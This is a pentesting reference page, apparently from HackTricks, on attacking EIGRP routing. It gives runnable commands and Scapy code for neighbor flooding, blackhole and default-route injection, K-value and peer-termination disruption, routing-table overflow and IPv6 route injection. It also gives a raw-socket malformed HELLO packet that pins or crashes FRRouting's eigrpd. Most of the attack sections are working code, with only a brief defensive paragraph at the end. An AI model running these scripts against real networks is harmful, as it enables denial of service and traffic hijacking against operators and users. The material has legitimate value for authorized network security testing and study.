---
title: "EIGRP Attacks"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/generic-methodologies-and-resources/pentesting-network/eigrp-attacks.html
fetched_at: 2026-09-20T08:53:25Z
license: unspecified
category: network
---

## **Fake EIGRP Neighbors Attack**

**Fake EIGRP Neighbors Attack**

- **Objective** : To overload router CPUs by flooding them with EIGRP hello packets, potentially leading to a Denial of Service (DoS) attack.
- **Tool** :**helloflooding.py** script.
- **Execution** :```
~$ sudo python3 helloflooding.py --interface eth0 --as 1 --subnet 10.10.100.0/24
```
- **Parameters** :
  - `--interface` : Specifies the network interface, e.g.,`eth0` .
  - `--as` : Defines the EIGRP autonomous system number, e.g.,`1` .
  - `--subnet` : Sets the subnet location, e.g.,`10.10.100.0/24` .

## [**EIGRP Blackhole Attack**](#eigrp-blackhole-attack)

**EIGRP Blackhole Attack**

- **Objective** : To disrupt network traffic flow by injecting a false route, leading to a blackhole where the traffic is directed to a non-existent destination.
- **Tool** :**routeinject.py** script.
- **Execution** :```
~$ sudo python3 routeinject.py --interface eth0 --as 1 --src 10.10.100.50 --dst 172.16.100.140 --prefix 32
```
- **Parameters** :
  - `--interface` : Specifies the attacker’s system interface.
  - `--as` : Defines the EIGRP AS number.
  - `--src` : Sets the attacker’s IP address.
  - `--dst` : Sets the target subnet IP.
  - `--prefix` : Defines the mask of the target subnet IP.

## **Abusing K-Values Attack**

**Abusing K-Values Attack**

- **Objective** : To create continuous disruptions and reconnections within the EIGRP domain by injecting altered K-values, effectively resulting in a DoS attack.
- **Tool** :**relationshipnightmare.py** script.
- **Execution** :```
~$ sudo python3 relationshipnightmare.py --interface eth0 --as 1 --src 10.10.100.100
```
- **Parameters** :
  - `--interface` : Specifies the network interface.
  - `--as` : Defines the EIGRP AS number.
  - `--src` : Sets the IP Address of a legitimate router.

## [**Routing Table Overflow Attack**](#routing-table-overflow-attack)

**Routing Table Overflow Attack**

- **Objective** : To strain the router’s CPU and RAM by flooding the routing table with numerous false routes.
- **Tool** :**routingtableoverflow.py** script.
- **Execution** :```
sudo python3 routingtableoverflow.py --interface eth0 --as 1 --src 10.10.100.50
```
- **Parameters** :
  - `--interface` : Specifies the network interface.
  - `--as` : Defines the EIGRP AS number.
  - `--src` : Sets the attacker’s IP address.

## **Goodbye / Peer Termination Attack**

**Goodbye / Peer Termination Attack**

- **Objective** : To tear down an adjacency immediately by spoofing a graceful-shutdown HELLO from a legitimate neighbor.<sup>[\[1\]](#references)[\[6\]](#references)</sup>
- **Why it is useful** : It avoids the volume of a hello flood and can trigger convergence before the Hold Time expires.<sup>[\[6\]](#references)</sup>
- **Packet shape** : This is a HELLO whose PARAMETER TLV carries K-values set to`255` ; captures may decode it as**Peer Termination** or**Goodbye** depending on the IOS/Wireshark version.<sup>[\[1\]](#references)[\[6\]](#references)</sup>
- **Execution** :```
from scapy.all import *
load_contrib("eigrp")
sendp(Ether()/IP(src="10.10.100.1", dst="224.0.0.10") /
      EIGRP(opcode=5, asn=1, seq=0, ack=0,
            tlvlist=[EIGRPParam(k1=255, k2=255, k3=255,
                                k4=255, k5=255,
                                reserved=255, holdtime=15)]),
      iface="eth0")
```
- **Operational notes** :
  - Clone a real HELLO first and only replace the PARAMETER TLV if you want the software-version / TLV profile to match the segment.
  - Use the **real neighbor source IP** (and usually matching L2 profile) or the packet will only create noise instead of a clean teardown.
  - If authentication is enabled, the spoofed HELLO must also carry the correct AUTH TLV.<sup>[\[1\]](#references)[\[2\]](#references)</sup>

## [**Protocol Notes Useful for Attacks**](#protocol-notes-useful-for-attacks)

**Protocol Notes Useful for Attacks**

- **HELLO packets carry K-values and neighbors only form when they match.** This is the basis for K-value mismatch/relationship disruption attacks and why mismatched K-values prevent adjacency.<sup>[\[1\]](#references)</sup>
- **The PARAMETER TLV (Type 0x0001) in HELLO (and initial UPDATE) carries K-values and Hold Time** , so passive captures reveal the exact values used on the segment.<sup>[\[1\]](#references)</sup>
- **EIGRP uses IP protocol 88** , multicasting to**224.0.0.10** in IPv4 and**FF02::A** in IPv6. That makes it easy to spot with`tcpdump 'ip proto 88 or ip6 proto 88'` before attempting active abuse.<sup>[\[1\]](#references)</sup>
- **Reliable UPDATEs use sequence and acknowledgement fields, while SEQUENCE TLVs help order multicast and unicast delivery.** A simple multicast replay may not complete the reliable exchange needed for a long-lived neighbor.<sup>[\[1\]](#references)</sup>
- **New neighbors start in a pending state and must ACK a unicast INIT/NULL UPDATE before they are fully usable.** Replaying only multicast HELLOs is often not enough if you want a rogue adjacency that survives long enough to learn and poison routes.<sup>[\[1\]](#references)</sup>

## [**Passive Recon Before Injection**](#passive-recon-before-injection)

**Passive Recon Before Injection**

Before you try to inject routes, capture a legitimate HELLO / UPDATE exchange and extract the fields that define the local adjacency.[\[1\]](#references)

- **AS number**
- **K-values and Hold Time** from the PARAMETER TLV
- **Authentication in use** : none, MD5, or HMAC-SHA-256.<sup>[\[1\]](#references)[\[2\]](#references)</sup>
- **Neighbor source address** and the subnet/interface where EIGRP is active
- **Software / TLV profile** (`SOFTWARE_VERSION` ,`STUB` ,`SEQUENCE` ) so your crafted packets look like the local routers.<sup>[\[1\]](#references)</sup>

Useful commands:

```
# Passive sniffing
sudo tcpdump -ni eth0 'ip proto 88 or ip6 proto 88'
# Quick discovery and route enumeration on IPv4
sudo nmap --script broadcast-eigrp-discovery
# If you already know the AS
sudo nmap --script broadcast-eigrp-discovery --script-args broadcast-eigrp-discovery.as=100
```
Nmap’s `broadcast-eigrp-discovery` works by sending a HELLO to `224.0.0.10` and parsing the returned UPDATE packets, which is useful to enumerate prefixes before attempting a more intrusive route injection.[\[3\]](#references)

## [**Winning Path Selection Quietly**](#winning-path-selection-quietly)

**Winning Path Selection Quietly**

- **Prefer more-specific routes** . A forged`/32` (or`/128` in IPv6) is often more reliable and less noisy than trying to replace an entire`/24` , because longest-prefix match still wins even when the legitimate broader route is static or summarized.<sup>[\[4\]](#references)</sup>
- **Use an external candidate-default route when you only want to become the default path** . That is cleaner than flooding many unrelated destination prefixes.<sup>[\[5\]](#references)</sup>
- **Tune the route type you impersonate** . In Scapy,`EIGRPExtRoute` exposes`originrouter` ,`originasn` ,`tag` ,`externalmetric` ,`extprotocolid` , and`flags` , so you can make the advertisement look like redistributed static/BGP/OSPF leakage instead of a raw internal route.<sup>[\[5\]](#references)[\[8\]](#references)</sup>

Minimal default-route example from the Scapy script.[\[5\]](#references)

```
sendp(Ether()/IP(src="192.168.1.248", dst="224.0.0.10") /
      EIGRP(opcode="Update", asn=100,
            tlvlist=[EIGRPExtRoute(dst="0.0.0.0", prefixlen=0,
                                   nexthop="192.168.1.248",
                                   originrouter="192.168.1.248",
                                   flags="candidate-default")]))
```
## [**Scapy Packet Crafting (Route Injection / Fake Neighbors)**](#scapy-packet-crafting-route-injection--fake-neighbors)

Scapy ships an EIGRP contrib layer with TLVs like `EIGRPParam` and `EIGRPIntRoute`, which is enough to craft UPDATEs for route injection. The following example is adapted from the `davidbombal/scapy` EIGRP route injection script.[\[5\]](#references)[\[8\]](#references)

```
from scapy.all import *
load_contrib("eigrp")
sendp(Ether()/IP(src="192.168.1.248", dst="224.0.0.10") /
      EIGRP(opcode="Update", asn=100, seq=0, ack=0,
            tlvlist=[EIGRPIntRoute(dst="192.168.100.0",
                                   nexthop="192.168.1.248")]))
```
`EIGRPIntRoute` also exposes `delay`, `bandwidth`, `mtu`, `hopcount`, `reliability`, `load`, and `prefixlen`.<sup>[\[8\]](#references)</sup> Those defaults are good enough for a PoC, but in real tests the route may be **accepted but not preferred** unless you either inject a more-specific prefix or tune the metrics to look plausible for that segment.

The same repo includes quick “fake neighbor” scripts that sniff a real EIGRP packet and replay it with a spoofed source IP to create phantom neighbors (useful for CPU/neighbor-table pressure).[\[10\]](#references)

Scapy also exposes primitives that are useful when you need higher-fidelity emulation instead of a single UPDATE.[\[8\]](#references)

- `EIGRPAuthData` for authenticated adjacencies
- `EIGRPSeq` for sequence / conditional-receive handling
- `EIGRPNms` for tracking next multicast sequence values during reliable delivery
- `EIGRPStub` to mirror observed stub behavior
- `EIGRPv6IntRoute` /`EIGRPv6ExtRoute` for IPv6 route injection

That matters because reliable transport and observed STUB behavior affect whether a fake neighbor survives long enough to learn routes or receive queries.[\[1\]](#references)

## [**EIGRP for IPv6**](#eigrp-for-ipv6)

**EIGRP for IPv6**

EIGRP for IPv6 is a separate address-family transported over IPv6. It still uses EIGRP packet format / TLVs, but it multicasts to `FF02::A`. From an offensive perspective, that means a dual-stack segment may expose an EIGRP attack surface even when the IPv4 side looks clean.[\[1\]](#references)

Important differences:

- **In named mode, configure an IPv6 address family and its interfaces** (`address-family ipv6 ...` ,`af-interface` ); legacy syntax differs.<sup>[\[2\]](#references)</sup>
- **Capture the virtual router ID and link-local addressing** when emulating a peer; both appear in the EIGRPv6 packet format.<sup>[\[1\]](#references)</sup>
- **Authentication still matters for EIGRPv6 testing** : inspect the AUTH TLV and keying before sending crafted packets; named-mode IOS documents HMAC-SHA-256 for IPv6 address families.<sup>[\[1\]](#references)[\[2\]](#references)</sup>

Minimal Scapy example for IPv6 route injection.[\[8\]](#references)

```
from scapy.all import *
load_contrib("eigrp")
send(IPv6(src="fe80::250:56ff:feaa:1111", dst="ff02::a") /
     EIGRP(opcode="Update", asn=100, seq=0, ack=0,
           tlvlist=[EIGRPv6IntRoute(dst="2001:db8:dead:beef::",
                                    prefixlen=64,
                                    nexthop="fe80::250:56ff:feaa:1111")]),
     iface="eth0")
```
If the IPv6 next hop inside the route TLV is zeroed, receivers fall back to the IPv6 source address in the packet header. That makes source spoofing and correct link-local addressing especially important during EIGRPv6 testing.[\[1\]](#references)[\[8\]](#references)

- Scapy EIGRP contrib docs: [scapy.contrib.eigrp](https://scapy.readthedocs.io/en/latest/api/scapy.contrib.eigrp.html) .<sup>[\[8\]](#references)</sup>
- Example scripts: [davidbombal/scapy](https://github.com/davidbombal/scapy) .<sup>[\[5\]](#references)</sup>

## [**Routopsy & NSE Helpers**](#routopsy--nse-helpers)

**Routopsy & NSE Helpers**

- **Routopsy** builds a virtual-router attack lab (FRRouting + Scapy) and includes DRP attacks you can adapt for EIGRP tests.[Routopsy – Hacking Routing with Routers](https://sensepost.com/blog/2020/routopsy-hacking-routing-with-routers/) .<sup>[\[4\]](#references)</sup>
- Nmap’s NSE has a small `eigrp` library for parsing/generating a subset of EIGRP packets.[eigrp NSE library](https://nmap.org/nsedoc/lib/eigrp.html) .<sup>[\[9\]](#references)</sup>

## [**Authentication Recon**](#authentication-recon)

**Authentication Recon**

- EIGRP named mode supports **HMAC-SHA-256 authentication** via`authentication mode hmac-sha-256 ...` . If enabled, crafted packets must be authenticated with the correct key; if not enabled, spoofing/injection is easier to validate.<sup>[\[2\]](#references)</sup>
- RFC 7868 also defines both **MD5** and**SHA2-256** authentication data inside the EIGRP AUTH TLV, which is why passive captures quickly tell you whether a blind spoof is realistic or whether you first need key material.<sup>[\[1\]](#references)</sup>

## [**Implementation Parser Fuzzing**](#implementation-parser-fuzzing)

**Implementation Parser Fuzzing**

Route poisoning is not the only useful target: the EIGRP parser itself can be tested with **structure-aware mutations**. A 2026 study inferred the EIGRP header, Internet checksum and two-byte Type/Length fields from packet traces, then mutated TLV values while keeping enough of the packet valid to reach deeper parsing paths. Against FRRouting 10.3.1, both random and TLV-aware fuzzing found daemon failures after roughly 15–20 inputs, but structure-aware inputs exercised more of the HELLO/TLV processing code.[\[11\]](#references)

Useful mutation classes for an isolated router lab are:[\[11\]](#references)[\[12\]](#references)

- Keep the captured version, opcode, AS and packet shape, but make a TLV’s declared length shorter or longer than its actual data.
- Append bytes after a nominally complete TLV, try a second TLV with lengths `0` ,`1` ,`3` ,`4` and larger than the remaining packet, and vary truncated route-prefix data.
- Recalculate the EIGRP Internet checksum after every mutation. Otherwise, early checksum rejection prevents most parser paths from being reached.
- Monitor `eigrpd` ,`watchfrr` ,`vtysh` , CPU use and assertion/core logs; minimize any crashing input to distinguish an adjacency failure from a parser hang or daemon restart.

One concrete FRRouting bug was a HELLO TLV declaring 16 bytes while carrying extra zero bytes. The trailing bytes were treated as another zero-length TLV, the parser offset did not advance, and one packet could pin `eigrpd` near 100% CPU and make `vtysh` unresponsive. The fix rejects too-short, too-long and zero-length HELLO TLVs and was merged into the main, stable/10.4 and stable/10.3 branches.[\[11\]](#references)[\[12\]](#references)

The following sends the single malformed seed from the original report; use it **only against an authorized FRRouting 10.3.1 lab**, because the watchdog may repeatedly restart the affected daemon.[\[12\]](#references)

```
import socket, struct
dst = "10.12.0.1"
header = struct.pack("!BBHHII4sH", 2, 5, 0, 0, 0, 0, b"\x01" * 4, 1)
tlv = struct.pack("!HH", 0x0001, 0x0010) + b"\x00" * 20
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 88)
s.sendto(header + tlv, (dst, 0))
```
The same campaign also reached out-of-bounds stream reads and assertions in `stream_getc()`, `masklen2ip()` and `eigrp_fsm_event_nq_fcn()`, causing abort/restart behavior. This makes malformed route-bearing UPDATE TLVs a worthwhile corpus in addition to HELLO packets.[\[11\]](#references)

For defensive validation, restrict IP protocol 88 to expected routing links, enable authentication, and alert on `eigrpd` restarts, sustained CPU use or repeated malformed-TLV logs. Parser testing should be repeated after upgrades because authentication and packet filtering do not replace bounds and progress checks inside the decoder.[\[1\]](#references)[\[2\]](#references)[\[11\]](#references)

## [References](#references)

Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**

Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**

Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**

Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).

## Support HackTricks

- Check the
[**subscription plans**](https://github.com/sponsors/carlospolop)!
**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
